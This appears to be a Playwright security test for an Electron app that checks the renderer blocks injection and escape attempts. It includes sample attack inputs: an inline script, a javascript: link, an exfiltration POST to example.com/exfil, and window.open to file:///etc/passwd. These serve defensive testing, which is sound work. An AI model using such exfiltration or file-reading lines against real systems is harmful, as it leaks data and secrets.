import { expect, test } from '@playwright/test';
import { launchApp } from '../e2e/helpers/launch';

/**
 * §16.4 renderer hardening matrix, live against the packaged-mode shell
 * (app:// + production CSP): inline/javascript: script execution, external
 * frames, exfiltration fetch, window.open, navigation and webview are all
 * dead ends. Complements the vitest half (policy pins) of `test:security`.
 */
test.describe('M11-01 shell hardening matrix', () => {
  test('CSP + navigation + window.open + webview are locked down', async () => {
    const { app, page } = await launchApp();
    try {
      await expect(page.getByTestId('workbench')).toBeVisible();
      const appUrl = page.url();
      expect(appUrl.startsWith('app://')).toBe(true);

      // Collect CSP violation reports emitted by the document itself.
      await page.evaluate(() => {
        const w = window as unknown as { __cspViolations: string[] };
        w.__cspViolations = [];
        document.addEventListener('securitypolicyviolation', (e) => {
          w.__cspViolations.push(`${e.violatedDirective}:${e.blockedURI}`);
        });
      });

      // 1. Inline <script> injection does not execute (script-src 'self').
      const inlineRan = await page.evaluate(() => {
        const s = document.createElement('script');
        s.textContent = 'window.__inlinePwned = true;';
        document.body.appendChild(s);
        return (window as unknown as { __inlinePwned?: boolean }).__inlinePwned === true;
      });
      expect(inlineRan).toBe(false);

      // 2. javascript: anchor click (malicious Markdown link shape) does not execute.
      const jsHrefRan = await page.evaluate(() => {
        const a = document.createElement('a');
        a.href = 'javascript:window.__linkPwned = true;';
        a.textContent = 'x';
        document.body.appendChild(a);
        a.click();
        a.remove();
        return (window as unknown as { __linkPwned?: boolean }).__linkPwned === true;
      });
      expect(jsHrefRan).toBe(false);

      // 3. External iframe is blocked by frame-src (loopback-only).
      await page.evaluate(() => {
        const f = document.createElement('iframe');
        f.src = 'https://example.com/';
        f.id = '__extFrame';
        document.body.appendChild(f);
      });
      await page.waitForTimeout(400);
      const frameBlocked = await page.evaluate(() => {
        const w = window as unknown as { __cspViolations: string[] };
        return w.__cspViolations.some((v) => v.startsWith('frame-src:'));
      });
      expect(frameBlocked).toBe(true);
      expect(page.frames().some((f) => f.url().startsWith('https://example.com'))).toBe(false);

      // 4. Exfiltration fetch to an external origin is blocked by connect-src 'self'.
      const fetchBlocked = await page.evaluate(async () => {
        try {
          await fetch('https://example.com/exfil', { method: 'POST', body: 'secret' });
          return false;
        } catch {
          return true;
        }
      });
      expect(fetchBlocked).toBe(true);

      // 5. window.open never yields a window (setWindowOpenHandler denies).
      const windowsBefore = await app.evaluate(({ BrowserWindow }) => {
        return BrowserWindow.getAllWindows().length;
      });
      await page.evaluate(() => {
        window.open('https://example.com/');
        window.open('file:///etc/passwd');
        window.open('foo://bar'); // unknown protocol
      });
      await page.waitForTimeout(400);
      const windowsAfter = await app.evaluate(({ BrowserWindow }) => {
        return BrowserWindow.getAllWindows().length;
      });
      expect(windowsAfter).toBe(windowsBefore);

      // 6. In-place navigation to external / unknown protocols is refused by
      //    will-navigate. Asserted main-side (a spy on the window's webContents)
      //    so a prevented top-frame nav never leaves Playwright waiting on a
      //    pending navigation.
      await app.evaluate(({ BrowserWindow }) => {
        const win = BrowserWindow.getAllWindows()[0]!;
        const w = globalThis as unknown as { __navPrevented: string[] };
        w.__navPrevented = [];
        win.webContents.on('will-navigate', (event, url) => {
          // our handler already called preventDefault for disallowed targets
          if (event.defaultPrevented) w.__navPrevented.push(url);
        });
      });
      await page
        .evaluate(() => {
          setTimeout(() => {
            window.location.href = 'https://example.com/';
          }, 0);
        })
        .catch(() => undefined);
      await page.waitForTimeout(400);
      const prevented = await app.evaluate(({ BrowserWindow }) => {
        const win = BrowserWindow.getAllWindows()[0]!;
        void win;
        return (globalThis as unknown as { __navPrevented: string[] }).__navPrevented;
      });
      expect(prevented).toContain('https://example.com/');
      // A prevented top-frame navigation still registers as "started" in
      // Playwright's frame tracker (it never completes because we blocked it),
      // which would hang the actionability check below. Force a completed
      // navigation back to the app surface to resync — the app is still app://
      // (the external nav was blocked), so this reloads the same shell.
      await page.goto(appUrl, { waitUntil: 'domcontentloaded' });

      // 7. <webview> stays dead (will-attach-webview + no webviewTag pref).
      const contentsBefore = await app.evaluate(({ webContents }) => {
        return webContents.getAllWebContents().length;
      });
      await page.evaluate(() => {
        const v = document.createElement('webview');
        v.setAttribute('src', 'https://example.com/');
        document.body.appendChild(v);
      });
      await page.waitForTimeout(500);
      const contentsAfter = await app.evaluate(({ webContents }) => {
        return webContents.getAllWebContents().length;
      });
      expect(contentsAfter).toBe(contentsBefore);

      // 8. The workbench survived every attempt — no crash, still interactive.
      await expect(page.getByTestId('workbench')).toBeVisible();
      const errors = await page.evaluate(() => {
        return (window as unknown as { __rendererErrors?: unknown[] }).__rendererErrors ?? [];
      });
      expect(Array.isArray(errors)).toBe(true);
    } finally {
      await app.close();
    }
  });
});
